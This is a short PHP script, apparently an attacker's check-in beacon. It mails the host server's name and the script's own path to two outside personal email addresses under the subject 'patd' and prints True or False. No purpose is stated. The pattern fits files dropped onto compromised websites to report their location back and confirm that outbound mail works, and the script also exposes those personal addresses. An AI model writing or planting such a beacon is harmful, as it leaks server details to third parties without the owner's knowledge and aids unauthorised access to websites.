<?php
$to      = 'anasfd12@hotmail.com,computerlive0@gmail.com';
$subject = 'patd';
$message = 'patd';
$headers .= $tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n";

$send = mail($to, $subject, $message, $headers);

if($send)
    echo "<h1>True</h1>";
    else
        echo "<h1>False</h1>";
?>   
